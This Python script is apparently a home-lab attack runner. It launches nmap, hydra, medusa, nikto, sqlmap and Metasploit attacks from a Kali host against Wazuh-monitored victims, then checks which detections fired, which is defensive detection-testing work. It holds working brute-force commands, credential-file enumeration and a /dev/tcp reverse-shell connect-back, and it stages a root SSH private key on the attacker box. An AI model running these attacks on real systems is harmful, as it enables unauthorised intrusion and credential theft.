#!/usr/bin/env python3
"""
SENTINEL-AI Commander - Interactive Attack Runner (v3)
=======================================================

Changes vs v2:
- Auto-copy the ansible SSH key to Kali at /tmp/lab_id_rsa before any
  attack runs (Kali doesn't have a key by default - reverse_shell and
  privesc_enum simulate post-exploitation steps that need it).
- Updated reverse_shell + privesc_enum commands to use the new path.
- Key is removed from Kali at end of run (atexit handler).
"""
from __future__ import annotations

import argparse
import atexit
import json
import shlex
import socket
import subprocess
import sys
import textwrap
import time
import urllib3
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REPO_ROOT = Path.home() / "sentinel-ai-commander"
ANSIBLE_KEY = REPO_ROOT / "ansible/keys/id_rsa"
ENV_FILE = REPO_ROOT / ".env"

DEFAULT_KALI_IP = "192.168.49.131"
DEFAULT_KALI_NAME = "kali-agent-1"

# Path on Kali where we drop the key for the run
KALI_KEY_PATH = "/tmp/lab_id_rsa"

WAZUH_API_URL = "https://localhost:50001"
WAZUH_INDEXER_URL = "https://localhost:50002"
AI_AGENTS_URL = "http://localhost:50010"

OUTPUT_DIR = Path("/mnt/d/wazuh_project/attack_runs")
RESULTS_PATH = Path("/mnt/d/wazuh_project/attack_runner_results.json")


class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"; CYAN = "\033[36m"


def hdr(s):  print(f"\n{C.BOLD}{C.CYAN}=== {s} ==={C.RESET}")
def ok(s):   print(f"{C.GREEN}+ {s}{C.RESET}")
def warn(s): print(f"{C.YELLOW}! {s}{C.RESET}")
def err(s):  print(f"{C.RED}x {s}{C.RESET}")
def info(s): print(f"{C.DIM}  {s}{C.RESET}")


def load_env() -> Dict[str, str]:
    env = {}
    if not ENV_FILE.is_file():
        err(f"missing {ENV_FILE}"); sys.exit(1)
    for line in ENV_FILE.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        env[k.strip()] = v.strip().strip('"').strip("'")
    return env


def wazuh_token(user, password):
    r = requests.post(f"{WAZUH_API_URL}/security/user/authenticate",
                      auth=(user, password), verify=False, timeout=10)
    r.raise_for_status()
    return r.json()["data"]["token"]


def list_active_agents(token):
    r = requests.get(f"{WAZUH_API_URL}/agents",
                     headers={"Authorization": f"Bearer {token}"},
                     params={"limit": 500}, verify=False, timeout=10)
    r.raise_for_status()
    items = r.json().get("data", {}).get("affected_items", [])
    out = []
    for a in items:
        if a.get("status") != "active": continue
        if a.get("id") == "000": continue
        out.append({
            "id": a.get("id"), "name": a.get("name"), "ip": a.get("ip"),
            "status": a.get("status"),
            "os": (a.get("os") or {}).get("name") or (a.get("os") or {}).get("platform"),
        })
    return out


def alerts_in_window(password, target_ip, t0, t1):
    body = {
        "size": 200,
        "sort": [{"timestamp": {"order": "asc"}}],
        "query": {"bool": {
            "must": [{"range": {"timestamp": {"gte": t0, "lte": t1}}}],
            "should": [
                {"match_phrase": {"data.dest_ip": target_ip}},
                {"match_phrase": {"data.dst_ip":  target_ip}},
                {"match_phrase": {"data.dstip":   target_ip}},
                {"match_phrase": {"data.src_ip":  target_ip}},
                {"match_phrase": {"data.srcip":   target_ip}},
                {"match_phrase": {"agent.ip":     target_ip}},
            ],
            "minimum_should_match": 1,
        }},
        "aggs": {
            "by_sig":  {"terms": {"field": "data.alert.signature", "size": 30}},
            "by_rule": {"terms": {"field": "rule.description", "size": 30}},
        },
    }
    r = requests.post(f"{WAZUH_INDEXER_URL}/wazuh-alerts-4.x-*/_search",
                      auth=("admin", password), json=body, verify=False, timeout=15)
    r.raise_for_status()
    return r.json()


# ─── Kali key prep ─────────────────────────────────────────────────────


def prep_kali_key(kali_ip: str) -> bool:
    """Copy ansible private key to Kali at KALI_KEY_PATH. Returns True
    on success. Registers a cleanup handler to remove it on exit."""
    if not ANSIBLE_KEY.is_file():
        err(f"missing local key: {ANSIBLE_KEY}")
        return False
    info(f"copying lab key to {kali_ip}:{KALI_KEY_PATH}")
    cmd = [
        "scp", "-i", str(ANSIBLE_KEY),
        "-o", "StrictHostKeyChecking=no", "-o", "LogLevel=ERROR",
        str(ANSIBLE_KEY), f"root@{kali_ip}:{KALI_KEY_PATH}",
    ]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    if r.returncode != 0:
        err(f"scp failed: {r.stderr.strip()}")
        return False
    # chmod 600 on remote
    chmod = subprocess.run(
        ["ssh", "-i", str(ANSIBLE_KEY), "-o", "StrictHostKeyChecking=no",
         "-o", "LogLevel=ERROR", f"root@{kali_ip}", f"chmod 600 {KALI_KEY_PATH}"],
        capture_output=True, text=True, timeout=10,
    )
    if chmod.returncode != 0:
        err(f"chmod failed: {chmod.stderr.strip()}")
        return False
    ok(f"key staged on Kali")

    def cleanup():
        info(f"removing lab key from Kali")
        subprocess.run(
            ["ssh", "-i", str(ANSIBLE_KEY), "-o", "StrictHostKeyChecking=no",
             "-o", "LogLevel=ERROR", f"root@{kali_ip}",
             f"rm -f {KALI_KEY_PATH}"],
            capture_output=True, text=True, timeout=10,
        )
    atexit.register(cleanup)
    return True


# ─── Streaming SSH ─────────────────────────────────────────────────────


def ssh_kali_streaming(kali_ip: str, command: str, log_path: Path) -> str:
    cmd = [
        "ssh", "-i", str(ANSIBLE_KEY),
        "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
        "-o", "LogLevel=ERROR", "-o", "ServerAliveInterval=30",
        f"root@{kali_ip}", command,
    ]
    log_path.parent.mkdir(parents=True, exist_ok=True)
    chunks: List[str] = []
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        msg = f"[ssh launch failed: {e}]"
        log_path.write_text(msg); err(msg); return msg

    with log_path.open("w") as fh:
        fh.write(f"# command: {command}\n# started: {datetime.now(timezone.utc).isoformat()}\n\n")
        try:
            assert proc.stdout is not None
            for line in proc.stdout:
                print(f"    {line}", end="")
                fh.write(line); fh.flush()
                chunks.append(line)
        except KeyboardInterrupt:
            proc.terminate()
            warn("interrupted - terminating remote command")
            try: proc.wait(timeout=5)
            except subprocess.TimeoutExpired: proc.kill()
            raise
        proc.wait()
        fh.write(f"\n# exited: code={proc.returncode}  at={datetime.now(timezone.utc).isoformat()}\n")
    return "".join(chunks)


@dataclass
class Attack:
    key: str
    name: str
    desc: str
    needs_port: List[int] = field(default_factory=list)
    needs_kali_key: bool = False  # True for SSH-based post-exploitation sims


ATTACKS: Dict[str, Attack] = {
    "recon_basic":      Attack("recon_basic",      "Recon: nmap basic TCP scan",
                               "nmap -sT -T4 against top 100 ports"),
    "recon_aggressive": Attack("recon_aggressive", "Recon: nmap aggressive (-A -O)",
                               "OS detection, version detection, default scripts"),
    "recon_stealth":    Attack("recon_stealth",    "Recon: nmap SYN stealth + slow timing",
                               "-sS -T1 against common ports (tests detection of slow scans)"),
    "recon_vuln":       Attack("recon_vuln",       "Recon: nmap vulnerability scripts",
                               "--script=vuln category scripts"),
    "ssh_brute":        Attack("ssh_brute",        "SSH brute force (hydra, tiny wordlist)",
                               "hydra with 2 users x 5 passwords = 10 attempts",
                               needs_port=[22]),
    "ssh_brute_medusa": Attack("ssh_brute_medusa", "SSH brute force (medusa, alt tool)",
                               "medusa same wordlist - tests detection of multiple tools",
                               needs_port=[22]),
    "auth_failures":    Attack("auth_failures",    "Auth abuse: ssh failed logins",
                               "10 deliberately-wrong ssh attempts (Wazuh 5710/5712 territory)",
                               needs_port=[22]),
    "web_nikto":        Attack("web_nikto",        "Web: nikto vulnerability scan",
                               "full nikto run against port 80",
                               needs_port=[80]),
    "web_gobuster":     Attack("web_gobuster",     "Web: gobuster directory bust",
                               "dir enum with common.txt wordlist",
                               needs_port=[80]),
    "web_sqlmap":       Attack("web_sqlmap",       "Web: sqlmap probe",
                               "basic SQL injection probe (--batch, no exploitation)",
                               needs_port=[80]),
    "privesc_enum":     Attack("privesc_enum",     "Privilege escalation: passive enumeration",
                               "SSH in, run sudo -l, suid scan, kernel/version, world-writable dirs",
                               needs_port=[22], needs_kali_key=True),
    "reverse_shell":    Attack("reverse_shell",    "Reverse shell: Kali listener + victim connect-back",
                               "ncat -lvnp on Kali, victim curls back over TCP",
                               needs_port=[22], needs_kali_key=True),
    "msf_smb_login":    Attack("msf_smb_login",    "Metasploit: SMB login scanner (auxiliary)",
                               "msfconsole -x auxiliary/scanner/smb/smb_login"),
    "msf_ssh_version":  Attack("msf_ssh_version",  "Metasploit: SSH version scanner (auxiliary)",
                               "msfconsole -x auxiliary/scanner/ssh/ssh_version",
                               needs_port=[22]),
    "msf_http_enum":    Attack("msf_http_enum",    "Metasploit: HTTP enumeration (auxiliary)",
                               "msfconsole -x auxiliary/scanner/http/http_version + dir_scanner",
                               needs_port=[80]),
}


def cmd_recon_basic(t):       return f"nmap -sT -T4 --top-ports 100 -Pn {t}"
def cmd_recon_aggressive(t):  return f"nmap -sS -A -O -T4 -Pn -p 22,80,443,3306,3389,5432,5900,8080 {t}"
def cmd_recon_stealth(t):     return f"nmap -sS -T1 --max-rate 5 -Pn -p 22,80,443,3306,3389,5900 {t}"
def cmd_recon_vuln(t):        return f"nmap --script=vuln -T4 -Pn -p 22,80,443 {t}"


def cmd_ssh_brute(t):
    users = "louay\nadmin"
    pwds  = "wrong1\nwrong2\nletmein\npassword\nadmin123"
    return (f"echo -e {shlex.quote(users)} > /tmp/u.txt && "
            f"echo -e {shlex.quote(pwds)}  > /tmp/p.txt && "
            f"hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -W 2 -f -I ssh://{t}; "
            f"rm -f /tmp/u.txt /tmp/p.txt")


def cmd_ssh_brute_medusa(t):
    users = "louay\nadmin"
    pwds  = "wrong1\nwrong2\nqwerty\n12345"
    return (f"echo -e {shlex.quote(users)} > /tmp/u.txt && "
            f"echo -e {shlex.quote(pwds)}  > /tmp/p.txt && "
            f"medusa -h {t} -U /tmp/u.txt -P /tmp/p.txt -M ssh -t 1 -F; "
            f"rm -f /tmp/u.txt /tmp/p.txt")


def cmd_auth_failures(t):
    # No sshpass on Kali. Use BatchMode=yes against a series of fake
    # users so each attempt fails fast with 'Permission denied' and
    # logs as auth failure on the victim (Wazuh rules 5710/5712).
    return ("for u in nosuchuser1 nosuchuser2 admin1 admin2 root1 root2 "
            "test1 test2 fakeuser1 fakeuser2; do "
            f"  echo \"--- trying $u ---\"; "
            f"  ssh -o BatchMode=yes -o StrictHostKeyChecking=no "
            f"     -o ConnectTimeout=3 -o NumberOfPasswordPrompts=0 "
            f"     $u@{t} 'true' 2>&1; "
            "  sleep 1; "
            "done")


def cmd_web_nikto(t):     return f"nikto -h http://{t}/"
def cmd_web_gobuster(t):  return f"gobuster dir -u http://{t}/ -w /usr/share/wordlists/dirb/common.txt -t 10 --no-error"
def cmd_web_sqlmap(t):    return (f"sqlmap -u 'http://{t}/?id=1' --batch --level=1 --risk=1 "
                                  f"--threads=1 --timeout=10 --retries=1 --crawl=0 --technique=B")


def cmd_privesc_enum(t):
    enum = ("echo '== whoami =='; whoami; "
            "echo '== id =='; id; "
            "echo '== sudo -l =='; sudo -n -l 2>&1; "
            "echo '== suid binaries =='; find / -perm -4000 -type f 2>/dev/null; "
            "echo '== world-writable dirs =='; find / -perm -o+w -type d 2>/dev/null | head -30; "
            "echo '== kernel =='; uname -a; "
            "echo '== /etc/passwd =='; cat /etc/passwd; "
            "echo '== shadow readable? =='; ls -la /etc/shadow 2>&1; "
            "echo '== running services =='; ss -tlnp 2>/dev/null")
    return (f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
            f"-o LogLevel=ERROR -i {KALI_KEY_PATH} root@{t} {shlex.quote(enum)}")


def cmd_reverse_shell(t, kali_ip):
    port = 4444
    return (f"(ncat -lvnp {port} >/tmp/rs.out 2>&1 &) && sleep 1 && "
            f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
            f"-o LogLevel=ERROR -i {KALI_KEY_PATH} root@{t} "
            f"\"bash -c 'echo \\\"REVERSESHELL_TEST_$(hostname)\\\" > /dev/tcp/{kali_ip}/{port}'\"; "
            f"sleep 2 && pkill -f 'ncat -lvnp {port}' 2>/dev/null; "
            f"echo '--- listener output ---'; cat /tmp/rs.out 2>/dev/null; "
            f"rm -f /tmp/rs.out")


def cmd_msf_smb_login(t):
    return (f"msfconsole -q -x \"use auxiliary/scanner/smb/smb_login; "
            f"set RHOSTS {t}; set USERNAME admin; "
            f"set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt; "
            f"set VERBOSE false; set BRUTEFORCE_SPEED 1; run; exit\"")


def cmd_msf_ssh_version(t):
    return (f"msfconsole -q -x \"use auxiliary/scanner/ssh/ssh_version; "
            f"set RHOSTS {t}; run; exit\"")


def cmd_msf_http_enum(t):
    return (f"msfconsole -q -x \""
            f"use auxiliary/scanner/http/http_version; set RHOSTS {t}; run; "
            f"use auxiliary/scanner/http/dir_scanner; set RHOSTS {t}; "
            f"set DICTIONARY /usr/share/wordlists/dirb/common.txt; set THREADS 5; run; "
            f"exit\"")


COMMAND_BUILDERS = {
    "recon_basic":      cmd_recon_basic,
    "recon_aggressive": cmd_recon_aggressive,
    "recon_stealth":    cmd_recon_stealth,
    "recon_vuln":       cmd_recon_vuln,
    "ssh_brute":        cmd_ssh_brute,
    "ssh_brute_medusa": cmd_ssh_brute_medusa,
    "auth_failures":    cmd_auth_failures,
    "web_nikto":        cmd_web_nikto,
    "web_gobuster":     cmd_web_gobuster,
    "web_sqlmap":       cmd_web_sqlmap,
    "privesc_enum":     cmd_privesc_enum,
    "reverse_shell":    cmd_reverse_shell,
    "msf_smb_login":    cmd_msf_smb_login,
    "msf_ssh_version":  cmd_msf_ssh_version,
    "msf_http_enum":    cmd_msf_http_enum,
}


def probe_ports(ip, ports):
    out = {}
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        try: s.connect((ip, p)); out[p] = True
        except Exception: out[p] = False
        finally: s.close()
    return out


def prompt_multi_select(items, label, display_keys):
    hdr(f"Select {label}")
    for i, it in enumerate(items, 1):
        print(f"  [{i:2d}] " + "  ".join(str(it.get(k, '?')) for k in display_keys))
    print(f"  [{C.BOLD}all{C.RESET}] select everything")
    print(f"  [{C.BOLD}q{C.RESET}]   quit")
    while True:
        s = input(f"{C.BOLD}{label}> {C.RESET}").strip().lower()
        if s in ("q", "quit", "exit"): sys.exit(0)
        if s == "all": return list(range(len(items)))
        try:
            picks = set()
            for chunk in s.replace(" ", "").split(","):
                if not chunk: continue
                if "-" in chunk:
                    a, b = chunk.split("-", 1)
                    picks.update(range(int(a), int(b) + 1))
                else: picks.add(int(chunk))
            picks = [p - 1 for p in picks if 1 <= p <= len(items)]
            if picks: return sorted(set(picks))
        except ValueError: pass
        warn("invalid input, try again")


def print_indexer_summary(target_ip, t0, t1, password):
    try:
        data = alerts_in_window(password, target_ip, t0, t1)
    except Exception as e:
        err(f"indexer query failed: {e}")
        return 0, [], []
    total = data.get("hits", {}).get("total", {}).get("value", 0)
    print(f"  alerts in window: {C.BOLD}{total}{C.RESET}")
    if total == 0: return 0, [], []
    sigs = data.get("aggregations", {}).get("by_sig", {}).get("buckets", [])
    rules = data.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
    if sigs:
        print(f"  {C.CYAN}Suricata signatures:{C.RESET}")
        for b in sigs[:10]:
            print(f"    {b['doc_count']:4d}  {b['key']}")
    if rules:
        print(f"  {C.CYAN}Wazuh rule descriptions:{C.RESET}")
        for b in rules[:10]:
            print(f"    {b['doc_count']:4d}  {b['key'][:80]}")
    return total, sigs[:10], rules[:10]


def chatbot_summary(question):
    try:
        r = requests.post(f"{AI_AGENTS_URL}/chat",
                          json={"message": question, "preferred_provider": "groq"},
                          timeout=120)
        r.raise_for_status()
        return r.json().get("answer", "")
    except Exception as e:
        return f"[chatbot error: {e}]"


def main():
    ap = argparse.ArgumentParser(description="SENTINEL-AI attack runner v3")
    ap.add_argument("--kali", default=DEFAULT_KALI_IP)
    ap.add_argument("--no-summary", action="store_true",
                    help="Skip chatbot summary at end")
    args = ap.parse_args()

    env = load_env()
    indexer_pw = env.get("WAZUH_INDEXER_PASSWORD") or ""
    api_pw = env.get("WAZUH_API_PASSWORD") or ""
    api_user = env.get("WAZUH_API_USER", "wazuh-wui")
    if not indexer_pw or not api_pw:
        err("missing WAZUH_INDEXER_PASSWORD or WAZUH_API_PASSWORD in .env"); sys.exit(1)

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    hdr("SENTINEL-AI Commander :: Attack Runner v3")
    info(f"Kali attacker: {args.kali}")
    info(f"Output dir:    {OUTPUT_DIR}")

    hdr("Discovering active agents")
    try:
        token = wazuh_token(api_user, api_pw)
        agents = list_active_agents(token)
    except Exception as e:
        err(f"Wazuh API failure: {e}"); sys.exit(1)

    agents = [a for a in agents if a["ip"] != args.kali and a["name"] != DEFAULT_KALI_NAME]
    if not agents:
        err("no active victim agents found"); sys.exit(1)
    ok(f"found {len(agents)} active victim agent(s)")

    chosen = prompt_multi_select(agents, "targets",
                                  display_keys=["id", "name", "ip", "os"])
    targets = [agents[i] for i in chosen]

    hdr("Probing service ports on targets")
    probes = {}
    for t in targets:
        results = probe_ports(t["ip"], [22, 80, 443, 3306, 3389, 5432, 5900, 8080])
        probes[t["ip"]] = results
        open_ports = [p for p, ok_ in results.items() if ok_]
        info(f"{t['name']:25} {t['ip']:15}  open: {open_ports}")

    attack_items = [{"key": a.key, "name": a.name, "desc": a.desc} for a in ATTACKS.values()]
    chosen_atk = prompt_multi_select(attack_items, "attacks",
                                       display_keys=["name", "desc"])
    attacks = [ATTACKS[attack_items[i]["key"]] for i in chosen_atk]

    # If any selected attack needs the lab key on Kali, stage it once.
    if any(a.needs_kali_key for a in attacks):
        hdr("Preparing Kali (lab SSH key)")
        if not prep_kali_key(args.kali):
            err("could not stage lab key on Kali — privesc/reverse_shell will fail")
            warn("continuing anyway with remaining attacks")

    runs: List[Dict[str, Any]] = []
    run_stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    for t in targets:
        target_ip = t["ip"]; target_name = t["name"]
        open_ports = {p for p, ok_ in probes[target_ip].items() if ok_}
        for atk in attacks:
            if atk.needs_port and not any(p in open_ports for p in atk.needs_port):
                warn(f"skip {atk.key} on {target_name} - needs ports {atk.needs_port}")
                continue
            hdr(f"[{target_name} :: {target_ip}] {atk.name}")
            info(atk.desc)
            cmd_builder = COMMAND_BUILDERS[atk.key]
            cmd = cmd_builder(target_ip, args.kali) if atk.key == "reverse_shell" else cmd_builder(target_ip)

            log_path = OUTPUT_DIR / f"{run_stamp}_{target_name}_{atk.key}.log"
            t0 = datetime.now(timezone.utc).isoformat()
            print(f"{C.DIM}+ ssh root@{args.kali} '{cmd[:100]}{'...' if len(cmd)>100 else ''}'{C.RESET}")
            print(f"{C.DIM}  log: {log_path}{C.RESET}")
            print(f"{C.DIM}  --- live output ---{C.RESET}")
            output = ssh_kali_streaming(args.kali, cmd, log_path)
            t1 = datetime.now(timezone.utc).isoformat()
            print(f"{C.DIM}  --- end output ({len(output.splitlines())} lines) ---{C.RESET}")

            print(f"{C.DIM}  waiting 8s for indexer ingestion...{C.RESET}")
            time.sleep(8)
            count, sigs, rules = print_indexer_summary(target_ip, t0, t1, indexer_pw)

            runs.append({
                "target": target_name,
                "target_ip": target_ip,
                "attack": atk.key,
                "attack_name": atk.name,
                "t0": t0,
                "t1": t1,
                "log_path": str(log_path),
                "alert_count": count,
                "top_suricata_signatures": [{"sig": b["key"], "count": b["doc_count"]} for b in sigs],
                "top_wazuh_rules":         [{"rule": b["key"], "count": b["doc_count"]} for b in rules],
            })

    hdr("Run summary")
    print(f"  {'target':25} {'attack':30} {'alerts':>8}  log")
    print(f"  {'-'*25} {'-'*30} {'-'*8}  {'-'*40}")
    for r in runs:
        col = C.GREEN if r["alert_count"] > 0 else C.RED
        log_short = Path(r["log_path"]).name
        print(f"  {r['target']:25} {r['attack']:30} {col}{r['alert_count']:>8}{C.RESET}  {log_short}")

    RESULTS_PATH.parent.mkdir(parents=True, exist_ok=True)
    RESULTS_PATH.write_text(json.dumps(runs, indent=2))
    ok(f"results saved: {RESULTS_PATH}")
    ok(f"per-attack logs in: {OUTPUT_DIR}")

    if not args.no_summary and runs:
        hdr("Chatbot summary")
        atks = sorted({r['attack_name'] for r in runs})
        tgts = sorted({r['target'] for r in runs})
        q = (f"What Suricata signatures and Wazuh rules fired on {tgts} in the last 30 minutes "
             f"during these attacks: {atks}?")
        info(f"{q[:140]}...")
        ans = chatbot_summary(q)
        if ans:
            print()
            print(textwrap.fill(ans, width=100, initial_indent="  ", subsequent_indent="  "))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(); warn("interrupted"); sys.exit(130)
